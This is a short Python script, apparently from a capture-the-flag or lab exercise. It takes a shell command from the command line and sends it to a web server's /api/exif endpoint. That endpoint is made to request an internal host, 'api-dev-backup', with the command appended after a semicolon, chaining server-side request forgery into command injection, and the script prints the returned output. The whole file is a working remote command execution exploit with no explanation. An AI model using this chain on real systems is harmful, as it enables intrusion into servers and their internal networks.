#! /usr/bin/python3

import requests
import os
import sys

cmd = sys.argv[1]
r = requests.get(f'http://10.10.244.205/api/exif?url=http://api-dev-backup:8080/exif?url=1;{cmd}')
result = r.text
lines = result.splitlines()
if (len(lines) > 6):
    print('\n'.join(lines[6:]))
else:
    print('\n'.join(lines))

